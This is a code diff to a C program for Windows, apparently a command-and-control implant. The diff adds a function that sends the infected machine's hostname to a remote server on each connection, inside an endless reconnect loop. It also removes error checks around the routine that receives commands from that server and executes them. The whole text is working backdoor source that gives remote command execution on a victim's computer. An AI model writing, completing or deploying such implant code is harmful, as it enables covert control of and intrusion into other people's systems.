@@ -36,6 +36,14 @@ int initializeServer(SOCKET *s,struct sockaddr_in *server, WSADATA *wsa)
     return 0;
 }
 
+int ImplantID(int s)
+{
+    char hostname[1024];
+    gethostname(hostname, sizeof(hostname) - 1);
+    strcat(hostname, "\n");
+    send(s, hostname, strlen(hostname), 0);
+    return 0;
+}
 
 int executeCommands(char *command, int s)
 {
@@ -61,21 +69,8 @@ int receiveCommands(SOCKET s)
     char command[1024];
 
     recv_commands = recv(s, command, sizeof(command), 0);
-        if(recv_commands == SOCKET_ERROR)
-        {
-            printf("[-] Error receiving commands: %d", WSAGetLastError());
-            return 1;
-        } 
 
-        if(recv_commands == 0) { //return value of recv when connection cloesse
-            printf("[-] Server disconnected\n");
-            return 0;
-        }
         command[recv_commands] = '\0';
-        if(strcmp(command, "NO_COMMAND") == 0)
-        {
-            return 0;
-        }
         executeCommands(command,s);
 }
 
@@ -86,10 +81,11 @@ int main()
     WSADATA wsa;
     SOCKET s;
     struct sockaddr_in server;
-   
+
    while(1)
    {
     initializeServer(&s,&server,&wsa);
+    ImplantID(s);
     receiveCommands(s);
     closesocket(s);
     WSACleanup();
